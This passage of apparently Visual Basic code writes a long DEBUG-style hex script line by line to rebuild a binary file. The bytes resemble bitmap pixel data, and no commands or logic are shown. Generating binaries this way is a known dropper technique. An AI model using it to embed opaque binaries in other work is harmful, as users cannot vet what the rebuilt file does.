Print #hFile, "E 41B0 F8 F8 EC ED EB B5 F2 EE 09 F7 EF 09 F7 EF BB FB"
Print #hFile, "E 41C0 F2 F6 FD F8 F1 FA FF D3 DE F9 56 60 8F 65 70 AC"
Print #hFile, "E 41D0 80 8E D0 82 92 D4 89 9B D6 87 9A D3 28 DF E7 09"
Print #hFile, "E 41E0 F7 EF 2A E1 EA 8E 9D DB 8F A0 D8 22 E7 EB 09 F7"
Print #hFile, "E 41F0 EF 09 F7 EF 09 F7 EF 52 C3 E1 8A 9D D6 89 9C D5"
Print #hFile, "E 4200 84 96 D3 81 90 CE 8C 97 D3 7F 89 B9 97 A1 BF ED"
Print #hFile, "E 4210 F6 FF 43 F8 F2 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 4220 EF 09 F7 EF 10 C5 C1 00 06 0A 00 04 05 01 04 02"
Print #hFile, "E 4230 04 00 00 04 01 00 08 C9 C3 09 F7 EF 09 F7 EF 07"
Print #hFile, "E 4240 93 8F 10 1B 1F 12 1E 20 1A 1F 22 1E 25 28 12 54"
Print #hFile, "E 4250 55 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 05 4F 52"
Print #hFile, "E 4260 27 39 44 43 53 60 4D 5B 67 54 63 6C 47 57 5E 47"
Print #hFile, "E 4270 59 60 4D 60 68 56 69 76 63 77 89 53 67 79 66 79"
Print #hFile, "E 4280 88 5C 6F 7C 15 27 32 29 39 40 4C 58 5A 00 01 00"
Print #hFile, "E 4290 00 00 F3 F5 F5 EA EF EE DC E1 DF CB D2 CF BF C6"
Print #hFile, "E 42A0 C1 B2 BB B8 00 04 03 67 6F 6F 61 6A 6E 59 60 69"
Print #hFile, "E 42B0 5C 65 6F 55 5E 68 16 CC C8 09 F7 EF 09 F7 EF 26"
Print #hFile, "E 42C0 A3 A3 55 5B 66 54 5A 65 4F 53 5E 4B 4F 5A 56 5A"
Print #hFile, "E 42D0 65 61 66 6F 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 42E0 09 F7 EF 09 F7 EF 08 72 71 20 25 28 34 37 3B 33"
Print #hFile, "E 42F0 38 3B 37 3D 42 2D 33 38 29 69 6B 09 F7 EF 09 F7"
Print #hFile, "E 4300 EF 09 F7 EF 1D 5C 5C 07 0C 0F 03 07 08 BB BF C0"
Print #hFile, "E 4310 FD FF FF E8 EA EA EF F0 EE B4 F1 ED 09 F7 EF 09"
Print #hFile, "E 4320 F7 EF B4 F5 EE F0 F9 F6 EE F8 FF BE C9 E5 4E 58"
Print #hFile, "E 4330 88 73 7E BA 7B 89 CB 7C 8D CC 82 95 CE 91 A5 DC"
Print #hFile, "E 4340 2C E3 EB 09 F7 EF 2A E1 E9 91 A2 DA 8D A1 D1 28"
Print #hFile, "E 4350 E0 E6 09 F7 EF 09 F7 EF 09 F7 EF 4E CE E6 8E 9F"
Print #hFile, "E 4360 D7 89 9A D2 89 99 D4 8A 99 D7 86 91 CD 7F 8A BE"
Print #hFile, "E 4370 7F 88 AD CD D6 EA 35 F9 F2 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4380 F7 EF 18 EF E8 09 F7 EF 11 C6 C2 00 00 04 00 00"
Print #hFile, "E 4390 01 00 00 00 04 00 00 06 02 01 08 70 6C 09 F7 EF"
Print #hFile, "E 43A0 09 F7 EF 0A C0 BB 18 27 2A 0E 1A 1E 09 12 16 13"
Print #hFile, "E 43B0 1C 20 0D 52 53 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 43C0 EF 0A 54 57 2F 41 4C 51 62 6F 65 75 81 74 83 8C"
Print #hFile, "E 43D0 56 66 6D 4C 5C 62 49 5B 62 5B 6D 78 6C 7E 8F 53"
Print #hFile, "E 43E0 67 79 4C 5F 6E 6B 7E 8B 3C 4E 59 3D 4F 56 4F 5B"
Print #hFile, "E 43F0 5D 00 08 06 00 00 F0 F5 F4 E9 EF EE DA E1 DE CA"
Print #hFile, "E 4400 D1 CE BE C5 C2 B2 BB B8 00 05 04 66 6F 72 57 5F"
Print #hFile, "E 4410 66 55 5C 65 57 5F 6C 5D 65 72 0E EE E7 09 F7 EF"
Print #hFile, "E 4420 09 F7 EF 23 9F A0 60 66 71 4C 52 5F 43 49 56 42"
Print #hFile, "E 4430 48 53 45 4B 56 4D 54 5D 1A CE CB 09 F7 EF 09 F7"
Print #hFile, "E 4440 EF 09 F7 EF 09 F7 EF 09 F7 EF 12 52 52 05 0D 0D"
Print #hFile, "E 4450 12 17 18 24 29 2A 19 1E 21 03 08 0B 20 5F 5F 09"
Print #hFile, "E 4460 F7 EF 09 F7 EF 09 F7 EF 16 54 53 00 00 01 78 7C"
Print #hFile, "E 4470 7D FB FF FF E8 ED EC E3 E8 E7 F3 F5 F5 B5 F3 F1"
Print #hFile, "E 4480 09 F7 EF 09 F7 EF B8 F8 F3 F7 FF FF EC F5 FF 96"
Print #hFile, "E 4490 A0 BE 55 5F 8E 7B 87 C1 7D 8C CA 84 96 D1 83 98"
Print #hFile, "E 44A0 CC 85 9B CB 2B D6 DF 09 F7 EF 20 D7 DE 66 78 A7"
Print #hFile, "E 44B0 61 77 A0 36 B9 C8 09 F7 EF 09 F7 EF 09 F7 EF 2D"
Print #hFile, "E 44C0 CA D6 7E 90 BF 8C 9D CE 90 A0 D5 8E 9C D6 8D 9B"
Print #hFile, "E 44D0 D6 8E 9A D0 7E 8A B4 94 9F BB 09 F7 EF 09 F7 EF"
Print #hFile, "E 44E0 09 F7 EF 09 F7 EF 36 E9 E6 09 F7 EF 13 C8 C4 00"
Print #hFile, "E 44F0 00 04 00 04 05 00 00 00 02 00 00 02 00 00 05 23"
Print #hFile, "E 4500 22 09 F7 EF 09 F7 EF 09 F7 EF 20 33 38 17 27 2D"
Print #hFile, "E 4510 0C 18 1E 11 1D 23 15 5B 5F 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4520 F7 EF 09 F7 EF 16 61 65 39 4C 59 60 71 7E 81 91"
Print #hFile, "E 4530 9D 87 96 9F 52 62 68 45 55 5B 2F 41 48 34 46 51"
Print #hFile, "E 4540 51 64 73 56 68 79 3C 51 60 57 6D 79 54 67 74 4A"
Print #hFile, "E 4550 5B 64 49 55 59 00 04 04 00 00 F0 F6 F5 E9 EF EE"
Print #hFile, "E 4560 D9 E0 DD C9 D0 CD BF C6 C3 B2 BB B8 00 04 04 64"
Print #hFile, "E 4570 6D 70 5C 64 6B 5C 63 6C 56 5C 69 56 5E 6B 09 F7"
Print #hFile, "E 4580 EF 09 F7 EF 09 F7 EF 1B 97 98 53 5B 68 39 41 4E"
Print #hFile, "E 4590 38 40 4D 3F 47 54 38 41 4B 37 40 4A 28 94 97 09"
Print #hFile, "E 45A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3E 72"
Print #hFile, "E 45B0 73 28 31 34 12 1B 1E 14 1B 1E 00 00 03 1B 1E 22"
Print #hFile, "E 45C0 27 64 65 09 F7 EF 09 F7 EF 09 F7 EF 04 5D 5B 29"
Print #hFile, "E 45D0 2D 2E F1 F5 F6 F8 FC FD E2 E7 E6 E2 E7 E6 EA EF"
Print #hFile, "E 45E0 EE B4 F3 F1 09 F7 EF 09 F7 EF B5 F6 F3 EB F4 F8"
Print #hFile, "E 45F0 D5 DF F0 72 7D 9B 6E 7B A7 87 95 C9 74 85 BD 65"
Print #hFile, "E 4600 7A AE 44 5B 88 39 52 7A 1C 9E AF 09 F7 EF 1A D2"
Print #hFile, "E 4610 D5 53 69 8D 62 7C 9A 4B C4 CF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4620 09 F7 EF 1F D7 DA 58 6B 91 5A 6C 95 64 74 A2 6A"
Print #hFile, "E 4630 7B AC 7D 8D C2 84 95 C8 7C 8B B9 5F 95 AF 09 F7"
Print #hFile, "E 4640 EF 09 F7 EF 09 F7 EF 36 F8 F2 3B EF EB 09 F7 EF"
Print #hFile, "E 4650 0B EB E5 00 01 06 00 01 02 00 00 00 04 02 01 07"
Print #hFile, "E 4660 05 05 00 01 02 08 CA C4 09 F7 EF 09 F7 EF 30 51"
Print #hFile, "E 4670 57 37 4A 51 2C 3C 43 24 34 3B 26 6F 74 09 F7 EF"
Print #hFile, "E 4680 09 F7 EF 09 F7 EF 09 F7 EF 4F 9B A1 5C 71 80 65"
Print #hFile, "E 4690 78 87 7F 90 9D 6E 7F 88 2B 39 3F 31 40 43 17 27"
Print #hFile, "E 46A0 2D 11 22 2B 41 51 61 64 77 86 44 59 68 44 5A 66"
Print #hFile, "E 46B0 55 68 75 49 5C 64 41 50 53 00 01 01 00 00 F1 F5"
Print #hFile, "E 46C0 F6 E9 EE ED D8 DD DB C9 D0 CD BF C6 C3 B3 BC B9"
Print #hFile, "E 46D0 00 02 02 62 69 6C 66 6C 71 59 60 69 4D 53 5E 36"
Print #hFile, "E 46E0 76 7C 09 F7 EF 09 F7 EF 09 F7 EF 21 9D 9D 40 49"
Print #hFile, "E 46F0 56 2B 34 42 38 41 4E 46 4F 5C 40 49 56 3C 46 50"
Print #hFile, "E 4700 39 5F 67 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4710 F7 EF 35 3F 46 2B 36 3A 1B 26 2A 12 1B 1F 0D 10"
Print #hFile, "E 4720 14 25 26 2A 04 12 16 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4730 10 89 85 99 9B 9C FB FF FF D8 DC DD DA DE DF DD"
Print #hFile, "E 4740 E1 E2 E1 E5 E6 B2 F2 F0 09 F7 EF 09 F7 EF B7 F8"
Print #hFile, "E 4750 F8 E8 F1 FA CD D6 EA 65 70 8E 61 6F 99 52 62 90"
Print #hFile, "E 4760 2E 41 6E 17 2D 56 18 31 53 40 5A 78 3B BE C8 09"
Print #hFile, "E 4770 F7 EF 28 E1 E2 52 6B 85 1B 39 4C 0A 5E 68 09 F7"
Print #hFile, "E 4780 EF 09 F7 EF 09 F7 EF 1C EF EC 93 A6 C1 77 89 A8"
Print #hFile, "E 4790 63 76 97 5E 71 96 55 6A 97 5F 73 A2 66 79 A6 40"
Print #hFile, "E 47A0 A5 B9 09 F7 EF 09 F7 EF 09 F7 EF 4F F3 F0 38 EA"
Print #hFile, "E 47B0 E7 09 F7 EF 09 F7 EF 01 10 14 00 00 01 00 00 00"
Print #hFile, "E 47C0 03 01 01 02 00 00 04 06 07 05 8C 89 09 F7 EF 09"
Print #hFile, "E 47D0 F7 EF 39 86 8A 4E 63 6B 44 57 5F 3A 4C 57 1F 69"
Print #hFile, "E 47E0 70 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 4D 9B A2"
Print #hFile, "E 47F0 48 5D 6C 49 5C 6B 70 81 8E 55 65 71 0A 18 1E 1E"
Print #hFile, "E 4800 2D 30 0B 1B 21 14 26 2D 48 58 65 5F 6F 7F 45 5A"
Print #hFile, "E 4810 69 50 67 76 5A 70 7C 46 59 61 38 47 4A 00 01 01"
Print #hFile, "E 4820 00 00 F3 F5 F6 E8 EC ED D9 DB DB C9 CE CC C1 C6"
Print #hFile, "E 4830 C4 B5 BC B9 00 01 00 60 68 68 60 66 6B 4A 50 57"
Print #hFile, "E 4840 47 4C 55 2C 8A 8D 09 F7 EF 09 F7 EF 09 F7 EF 30"
Print #hFile, "E 4850 AC AC 43 4D 57 29 35 41 33 3D 47 3B 45 4F 34 3E"
Print #hFile, "E 4860 48 35 3F 49 37 41 4B 12 D6 D1 09 F7 EF 09 F7 EF"
Print #hFile, "E 4870 09 F7 EF 0C DE D9 1A 24 2B 1E 28 2F 1E 28 2F 18"
Print #hFile, "E 4880 21 25 1A 1B 1F 00 00 03 1C 1B 1F 09 F7 EF 09 F7"
Print #hFile, "E 4890 EF 09 F7 EF 75 EE EA FD FF FF ED EF F0 ED F1 F2"
Print #hFile, "E 48A0 D1 D5 D6 DC E0 E1 E2 E7 E8 B2 F2 F1 09 F7 EF 09"
Print #hFile, "E 48B0 F7 EF B3 F5 F8 DC E5 F2 B0 BB D1 38 43 61 13 23"
Print #hFile, "E 48C0 48 00 12 38 13 29 4D 35 4E 6E 72 8D A8 8A A6 BE"
Print #hFile, "E 48D0 44 C9 D1 09 F7 EF 13 CC CC 1D 38 4D 16 31 45 1D"
Print #hFile, "E 48E0 48 58 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6E 80"
Print #hFile, "E 48F0 97 87 99 B0 7F 92 AD 6C 81 A0 63 7B 9F 55 6E 96"
Print #hFile, "E 4900 49 61 8B 20 BD C7 09 F7 EF 09 F7 EF 09 F7 EF 72"
Print #hFile, "E 4910 EB EB 74 EB ED 09 F7 EF 09 F7 EF 54 A1 A1 60 5F"
Print #hFile, "E 4920 61 49 49 49 27 25 25 00 00 01 00 00 03 03 4E 4E"
Print #hFile, "E 4930 09 F7 EF 09 F7 EF 45 94 99 52 6A 76 4F 62 6F 4D"
Print #hFile, "E 4940 60 6D 2C 77 81 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 4950 EF 25 74 7C 2F 46 56 58 6C 7D 71 81 91 5B 6B 77"
Print #hFile, "E 4960 0A 1A 20 1A 29 2C 09 19 1F 27 37 3E 4E 5E 6B 3D"
Print #hFile, "E 4970 4D 5D 38 4D 5C 6D 84 93 6D 83 8F 44 57 5F 30 3F"
Print #hFile, "E 4980 42 00 06 06 00 00 F4 F3 F7 EB ED EE DB DB DB CA"
Print #hFile, "E 4990 CC CC C4 C7 C5 BA BF BD 00 01 00 57 5C 5D 4A 4E"
Print #hFile, "E 49A0 53 53 59 60 50 56 5D 26 A0 A0 09 F7 EF 09 F7 EF"
Print #hFile, "E 49B0 09 F7 EF 2A 6C 6C 39 43 4A 2A 36 3C 2E 38 3F 38"
Print #hFile, "E 49C0 42 49 38 41 4A 38 41 4A 39 42 4B 22 82 83 09 F7"
Print #hFile, "E 49D0 EF 09 F7 EF 09 F7 EF 0F B6 B3 12 1A 21 0C 14 1B"
Print #hFile, "E 49E0 0C 14 1B 0A 0E 13 10 0F 13 02 00 01 CC C9 CB 09"
Print #hFile, "E 49F0 F7 EF 09 F7 EF 09 F7 EF 83 FA F7 FD FF FF F4 F6"
Print #hFile, "E 4A00 F7 E5 E7 E8 D1 D5 D6 CF D3 D4 DC E1 E4 B1 F0 F1"
Print #hFile, "E 4A10 09 F7 EF 09 F7 EF B1 F4 F9 C4 CE DF 80 8C A4 00"
Print #hFile, "E 4A20 05 22 00 11 32 36 4B 6B 5A 72 90 7B 96 B0 6B 85"
Print #hFile, "E 4A30 9D 73 8E A3 5F BA C8 09 F7 EF 34 EC ED BD D6 F0"
Print #hFile, "E 4A40 B9 D2 EC B1 CB E3 1D F1 ED 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4A50 F7 EF 2E 76 85 1E 2E 45 43 58 6E 8D A5 BD 65 81"
Print #hFile, "E 4A60 9F 4E 6D 8E 58 75 9C 11 E5 E3 09 F7 EF 09 F7 EF"
Print #hFile, "E 4A70 09 F7 EF 8A DB DF 79 F1 F3 09 F7 EF 09 F7 EF 63"
Print #hFile, "E 4A80 F9 F5 FF FE FF FE FE FE FF FF FF FF FE FF B3 B6"
Print #hFile, "E 4A90 BB 04 7C 7B 09 F7 EF 09 F7 EF 4E 9E A6 48 63 71"
Print #hFile, "E 4AA0 46 5D 6C 54 6B 7B 46 93 9D 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4AB0 F7 EF 09 F7 EF 22 8C 93 55 6D 7F 68 7E 90 6C 7F"
Print #hFile, "E 4AC0 8E 5C 6C 78 04 14 1A 0D 1E 21 18 28 2E 2A 3A 41"
Print #hFile, "E 4AD0 47 57 64 3E 51 60 28 3D 4C 53 6A 79 92 A7 B6 60"
Print #hFile, "E 4AE0 72 7D 2C 3A 40 00 01 03 00 00 FD F9 FE F1 F0 F2"
Print #hFile, "E 4AF0 E0 DF E1 D1 D1 D1 C5 C6 C4 B4 B7 B5 00 01 00 5D"
Print #hFile, "E 4B00 61 62 47 4B 50 49 4F 54 46 4C 53 19 BF BC 09 F7"
Print #hFile, "E 4B10 EF 09 F7 EF 09 F7 EF 0A 4F 4E 0A 13 16 0D 19 1B"
Print #hFile, "E 4B20 23 2C 30 22 2B 2F 17 20 24 32 3B 3F 43 49 4E 26"
Print #hFile, "E 4B30 2C 31 0D DF D8 09 F7 EF 09 F7 EF 0F 7A 79 08 0C"
Print #hFile, "E 4B40 11 04 08 0D 0D 10 15 14 15 19 07 04 06 06 01 03"
Print #hFile, "E 4B50 F0 ED EF 09 F7 EF 09 F7 EF 09 F7 EF 82 F9 F6 FD"
Print #hFile, "E 4B60 FC FE F9 FB FC F6 F8 F9 E0 E4 E5 D0 D4 D5 D6 DB"
Print #hFile, "E 4B70 DE AF EF EF 09 F7 EF 09 F7 EF 9D E0 E5 CC D6 E7"
Print #hFile, "E 4B80 53 5E 79 06 13 33 42 53 74 60 75 94 79 92 AC 92"
Print #hFile, "E 4B90 AE C6 BF D9 F1 BA D3 ED 87 D3 E6 09 F7 EF 2B E3"
Print #hFile, "E 4BA0 E5 88 9C BF 82 98 BC 83 99 BD 30 DB E1 09 F7 EF"
Print #hFile, "E 4BB0 09 F7 EF 09 F7 EF 92 F5 F9 CE DC F8 AB BF D8 A3"
Print #hFile, "E 4BC0 BD D5 8F AD C6 73 92 B1 46 7E 9D 09 F7 EF 09 F7"
Print #hFile, "E 4BD0 EF 09 F7 EF 09 F7 EF BA D4 DD 99 E5 EA 09 F7 EF"
Print #hFile, "E 4BE0 09 F7 EF 17 F7 EF EC FD FD FB FB FB FF FD FD FB"
Print #hFile, "E 4BF0 FD FE EB EF F4 33 BE BD 09 F7 EF 09 F7 EF 46 95"
Print #hFile, "E 4C00 9F 50 6C 7D 4E 66 78 47 5F 71 47 95 A0 09 F7 EF"
Print #hFile, "E 4C10 09 F7 EF 09 F7 EF 09 F7 EF 17 B7 B8 56 6F 83 71"
Print #hFile, "E 4C20 87 99 6B 7D 8E 38 49 56 00 12 19 1E 2E 34 23 33"
Print #hFile, "E 4C30 39 2D 3E 47 3A 4B 58 33 46 55 37 4C 5B 41 58 67"
Print #hFile, "E 4C40 88 9D AC 81 93 9E 38 46 4C 00 01 03 00 00 FA F4"
Print #hFile, "E 4C50 F9 EE EB ED E0 DD DF D2 D2 D2 C5 C6 C4 B4 B7 B5"
Print #hFile, "E 4C60 00 01 00 6C 70 71 66 6A 6F 6B 71 78 73 78 81 22"
Print #hFile, "E 4C70 D7 D4 09 F7 EF 09 F7 EF 09 F7 EF 17 5C 5B 08 11"
Print #hFile, "E 4C80 14 03 0D 0D 00 01 04 00 04 07 12 19 1C 1D 22 25"
Print #hFile, "E 4C90 19 1D 1E 17 1B 1C 03 31 31 09 E9 E1 09 F7 EF 02"
Print #hFile, "E 4CA0 2E 2E 00 00 01 02 01 03 02 00 01 02 00 01 04 00"
Print #hFile, "E 4CB0 00 65 60 61 FF FE FF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4CC0 81 F8 F5 F7 F6 F8 FC FE FF FD FF FF F0 F3 F7 D3"
Print #hFile, "E 4CD0 D6 DA CD D0 D4 AD EB EC 09 F7 EF 09 F7 EF 90 D3"
Print #hFile, "E 4CE0 D9 AD BA CA 32 3F 59 2D 3C 5C 50 63 84 7A 8F AF"
Print #hFile, "E 4CF0 BB D3 EF AD C5 E1 6E 83 A2 61 75 98 42 8A A6 09"
Print #hFile, "E 4D00 F7 EF 1C D4 D9 5E 6D 9E 59 6A 9D 54 65 98 3C AC"
Print #hFile, "E 4D10 C6 09 F7 EF 09 F7 EF 09 F7 EF 2B C5 CF 84 91 B7"
Print #hFile, "E 4D20 A9 BC DD D0 E8 FF D3 F0 FF A0 C0 DD 35 C8 D3 09"
Print #hFile, "E 4D30 F7 EF 09 F7 EF 09 F7 EF 18 DE DB B0 C0 CC B0 E0"
Print #hFile, "E 4D40 E8 09 F7 EF 09 F7 EF 09 F7 EF 81 FA F6 F8 FA FA"
Print #hFile, "E 4D50 FD FC FE FD FE FF FA FD FF 3D F3 EF 09 F7 EF 09"
Print #hFile, "E 4D60 F7 EF 42 93 9E 4C 67 7B 54 6D 81 43 5C 70 38 86"
Print #hFile, "E 4D70 93 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4D80 3C 8A 97 6D 85 99 6F 83 95 23 34 41 10 21 2A 2A"
Print #hFile, "E 4D90 3C 43 28 3A 41 39 4C 54 39 49 59 37 49 5A 33 47"
Print #hFile, "E 4DA0 58 3F 53 64 8A 9D AC 92 A4 AF 2A 38 3E 00 01 03"
Print #hFile, "E 4DB0 00 00 F5 EF F4 EB E8 EA DE DC DC D0 D0 D0 C6 C7"
Print #hFile, "E 4DC0 C5 B8 BA BA 01 05 06 6D 71 76 77 7D 84 62 69 72"
Print #hFile, "E 4DD0 53 5C 66 11 E3 DE 09 F7 EF 09 F7 EF 09 F7 EF 3C"
Print #hFile, "E 4DE0 82 85 41 4C 50 13 1C 20 05 0E 12 05 0E 11 00 00"
Print #hFile, "E 4DF0 03 00 00 03 06 0A 0B 00 00 01 20 22 23 32 5F 5D"
Print #hFile, "E 4E00 2D B3 AE 79 77 77 97 92 93 A6 A1 A2 99 94 95 7E"
Print #hFile, "E 4E10 79 7A 11 0C 0D C1 BC BD FF FE FF 09 F7 EF 09 F7"
Print #hFile, "E 4E20 EF 09 F7 EF 52 F6 F2 F8 F7 F9 F7 F9 FA FB FD FE"
Print #hFile, "E 4E30 FA FB FF DD E0 E4 C8 CB CF AB E9 EA 09 F7 EF 09"
Print #hFile, "E 4E40 F7 EF 85 C8 CD A1 AD BF 24 30 4C 45 54 75 AA BD"
Print #hFile, "E 4E50 E0 BE D2 F5 6D 84 A4 35 4B 6E 54 67 8D 58 69 94"
Print #hFile, "E 4E60 4A 90 B2 09 F7 EF 20 D7 DE 66 73 AB 64 72 AC 64"
Print #hFile, "E 4E70 72 AD 3F 83 AE 09 F7 EF 09 F7 EF 09 F7 EF 0E EF"
Print #hFile, "E 4E80 EA 50 5F 8D 41 54 7A 3F 55 78 7A 96 B5 9F CA E5"
Print #hFile, "E 4E90 14 F6 F0 09 F7 EF 09 F7 EF 09 F7 EF 1C AC B0 9A"
Print #hFile, "E 4EA0 AB B8 E1 E5 F0 09 F7 EF 09 F7 EF 09 F7 EF 17 F7"
Print #hFile, "E 4EB0 EF E3 F4 F3 FA F9 FB FD FE FF E8 FC FE 09 F7 EF"
Print #hFile, "E 4EC0 09 F7 EF 09 F7 EF 3A 8A 97 48 65 7A 4E 69 7E 42"
Print #hFile, "E 4ED0 5A 70 30 7F 8C 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 4EE0 EF 09 F7 EF 09 F7 EF 28 D4 D5 49 A1 AB 1C 2F 3E"
Print #hFile, "E 4EF0 24 36 41 2A 3D 44 2D 40 47 4E 62 6D 4A 5C 6D 55"
Print #hFile, "E 4F00 69 7B 46 5A 6B 56 6A 7B 91 A4 B3 A1 B1 BD 2F 3B"
Print #hFile, "E 4F10 41 00 08 0A 00 00 FA F7 F9 F3 F0 F2 E2 E0 E0 CE"
Print #hFile, "E 4F20 CE CE C2 C4 C4 B6 BA BB 00 00 03 58 60 67 4D 56"
Print #hFile, "E 4F30 60 34 3D 4B 29 33 44 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4F40 09 F7 EF 39 49 56 47 53 5F 5B 65 6F 44 4D 57 22"
Print #hFile, "E 4F50 2B 34 36 3D 46 6C 74 7B AD B3 B8 E2 E6 EB F5 F6"
Print #hFile, "E 4F60 FA FF FE FF FF FF FF FB F9 F9 FE FA F9 FF FF FE"
Print #hFile, "E 4F70 FF FF FE FB F7 F6 F1 ED EC FF FF FE FD FB FA 09"
Print #hFile, "E 4F80 F7 EF 09 F7 EF 09 F7 EF 45 F8 F3 FC FB FD F3 F2"
Print #hFile, "E 4F90 F6 EC ED F1 FA FB FF EE EF F3 D1 D1 D7 AC E8 EA"
Print #hFile, "E 4FA0 09 F7 EF 09 F7 EF 8A CD D3 73 81 93 3D 4B 68 B8"
Print #hFile, "E 4FB0 C8 EC 90 A1 C8 1F 32 58 2D 42 68 50 64 8D 5A 6A"
Print #hFile, "E 4FC0 99 5E 6B 9F 61 6A A3 09 F7 EF 1D D3 DC 59 65 9F"
Print #hFile, "E 4FD0 55 63 9E 55 63 9E 5B 68 A6 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4FE0 F7 EF 09 F7 EF 48 AA C8 62 74 A3 57 6D 97 3F 57"
Print #hFile, "E 4FF0 7B 18 9E A9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5000 2F 8A 95 82 95 A2 DA E0 EB 3F F3 EF 09 F7 EF 09"
Print #hFile, "E 5010 F7 EF 09 F7 EF 42 F5 EF F9 F8 FA FD FE FF 97 F4"
Print #hFile, "E 5020 F7 09 F7 EF 09 F7 EF 09 F7 EF 2B 6F 7E 52 6E 86"
Print #hFile, "E 5030 48 62 7A 3A 52 6A 33 81 8F 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 5040 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5050 EF 0E D3 D0 29 65 6C 30 43 4B 3D 50 58 50 63 70"
Print #hFile, "E 5060 3E 52 63 58 6C 7E 6A 7E 8F 5A 6C 7D 6E 7E 8F 96"
Print #hFile, "E 5070 A6 B3 44 4D 56 00 02 06 00 00 FB F8 FA F3 F2 F4"
Print #hFile, "E 5080 E1 E1 E1 CB CD CD BF C4 C3 B5 BA BB 00 00 04 52"
Print #hFile, "E 5090 5B 65 52 5B 69 49 55 67 4E 5B 71 09 F7 EF 09 F7"
Print #hFile, "E 50A0 EF 09 F7 EF 09 F7 EF 34 47 5C 2F 3E 51 3D 4B 5D"
Print #hFile, "E 50B0 5C 68 7A 66 70 81 61 6B 7C 8F 98 A6 D1 DA E4 EE"
Print #hFile, "E 50C0 F5 FE F7 FA FF FB FE FF FD FE FF FE FD FF FF FE"
Print #hFile, "E 50D0 FE FF FF FE FF FF FE FF FF FE FF FF FE FB F9 F8"
Print #hFile, "E 50E0 FE FC FB 09 F7 EF 09 F7 EF 09 F7 EF 44 F7 F2 F3"
Print #hFile, "E 50F0 F2 F4 EE ED F1 E5 E4 E8 F4 F5 F9 F7 F8 FC E1 E1"
Print #hFile, "E 5100 E7 AB E7 E9 09 F7 EF 09 F7 EF 80 C4 CA 5F 6F 80"
Print #hFile, "E 5110 A2 B0 CD 75 85 AA 0E 1E 48 41 52 7D 50 63 8E 59"
Print #hFile, "E 5120 69 97 5F 6C A0 57 62 9B 51 59 94 09 F7 EF 1C D2"
Print #hFile, "E 5130 DA 56 64 99 52 62 97 4D 5C 94 4F 5D 97 21 CB D7"
Print #hFile, "E 5140 09 F7 EF 09 F7 EF 09 F7 EF 0E EF EB 46 90 B5 56"
Print #hFile, "E 5150 77 A3 32 A7 B9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5160 EF 09 F7 EF 17 3B 4F 7C 8F 9E CB D1 DC 5E E6 E5"
Print #hFile, "E 5170 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 64 FA F5 CB"
Print #hFile, "E 5180 FA FC 1F F1 EB 09 F7 EF 09 F7 EF 09 F7 EF 30 4C"
Print #hFile, "E 5190 64 4C 68 80 45 5E 78 34 4C 64 37 77 88 09 F7 EF"
Print #hFile, "E 51A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 51B0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 27 8E 90 53 67"
Print #hFile, "E 51C0 72 47 5C 6B 30 46 58 4E 63 78 75 86 99 56 68 79"
Print #hFile, "E 51D0 43 53 64 67 74 82 3E 47 50 00 00 04 00 00 F4 F4"
Print #hFile, "E 51E0 F4 EE EE EE DD DF DF CB D0 CF BF C4 C5 B3 BA BD"
Print #hFile, "E 51F0 00 02 09 60 69 76 5E 6A 7C 58 66 7C 49 57 73 11"
Print #hFile, "E 5200 D7 D5 09 F7 EF 09 F7 EF 0C ED E8 4C 62 7E 3E 50"
Print #hFile, "E 5210 6D 45 55 72 4A 58 74 5A 69 83 6F 7D 94 71 7E 94"
Print #hFile, "E 5220 7E 88 9A 9C A5 B3 DB E1 EE EC F1 FA F4 F7 FF F5"
Print #hFile, "E 5230 F8 FC F9 FB FC F8 FA FA FC FC FC FF FF FE FF FF"
Print #hFile, "E 5240 FE FF FF FE F8 F6 F5 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5250 46 F9 F3 EF EE F0 E8 E7 EB E4 E3 E7 EA E9 ED F3"
Print #hFile, "E 5260 F2 F6 EE EC F2 A2 DD DF 09 F7 EF 09 F7 EF 71 B6"
Print #hFile, "E 5270 BB 97 A7 B8 4C 59 79 13 21 4B 36 45 73 4C 5C 8B"
Print #hFile, "E 5280 5B 6B 9A 4E 5D 8E 53 5E 97 57 62 9C 56 6C A3 09"
Print #hFile, "E 5290 F7 EF 1A D1 D6 4B 5B 89 50 63 8E 57 6A 97 52 66"
Print #hFile, "E 52A0 95 32 A7 BE 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 52B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 52C0 F7 EF 09 F7 EF 33 DD E1 5A 6E 87 4F 5F 70 BA C3"
Print #hFile, "E 52D0 CD 85 D2 D5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
